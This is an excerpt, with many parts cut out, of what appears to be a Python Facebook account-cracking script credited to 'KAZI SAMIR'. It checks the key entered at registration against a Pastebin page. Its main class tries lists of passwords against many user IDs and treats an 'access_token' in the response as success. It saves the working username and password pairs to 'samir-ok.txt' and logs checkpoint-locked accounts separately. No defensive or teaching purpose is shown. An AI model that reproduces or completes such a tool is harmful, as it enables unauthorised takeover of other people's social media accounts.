...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://pastebin.com/raw/VPm79mat').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
...
def chigozie():
    ...
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801840261060');chigozie()
    try:
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : KAZI SAMIR");time.sleep (0.03)
    print("             [*]. FACEBOOK   : FOURKAN UDDIN TANVIR");time.sleep (0.03)
    print("             [*]. GITHUB     : kazisamir4");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [samir] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-samir] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('samir-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-samir] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
